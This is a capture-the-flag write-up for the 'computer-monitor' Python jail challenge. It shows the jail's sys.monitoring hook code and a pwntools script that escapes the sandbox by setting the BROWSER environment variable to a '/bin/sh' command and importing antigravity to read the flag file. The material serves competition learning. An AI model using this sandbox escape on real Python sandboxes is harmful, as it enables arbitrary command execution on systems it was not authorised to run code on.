# computer-monitor

```
so i bought a computer monitor from the store recently for my computer but i think now i need to buy a new computer as well

nc challs2.pyjail.club 28684
```

Attachment:

```python
#!/usr/local/bin/python3

import sys
from os import _exit

sm = sys.monitoring
sm.use_tool_id(2, 'computer-monitor')

inp = input('> ')
code = compile(inp, '<string>', 'exec')

exit_hook = lambda *a: _exit(0)
sm.set_local_events(2, code, sm.events.BRANCH + sm.events.CALL)
sm.register_callback(2, sm.events.BRANCH, exit_hook)
sm.register_callback(2, sm.events.CALL, exit_hook)
exec(code, {}, {})
```

It attachs `BRANCH` and `CALL` hooks to our code. However, `import` is not restried. Following [pyjail cheatsheet](https://shirajuki.js.org/blog/pyjail-cheatsheet/), we can get shell if we have access to environ and `import`:

```python
from pwn import *

context(log_level="debug")

#p = process(["python3", "main.py"])
p = remote("challs2.pyjail.club", 28684)
p.recvuntil(b"> ")
p.sendline(b"""import os;os.environ['BROWSER']='/bin/sh -c "cat flag.txt" #%s';import antigravity""")
p.interactive()
```

Flag: `jail{i_am_proto_your_security_is_my_motto_install_me_on_your_computer_to_protect_your_data_better_f6b37a6e6d0b0af2b5da77a61cd0af7c}`.

An elegant and simple solution is provided by @mirelgigel at [mirelgigel/writeupjailctf](https://github.com/mirelgigel/writeupjailctf).
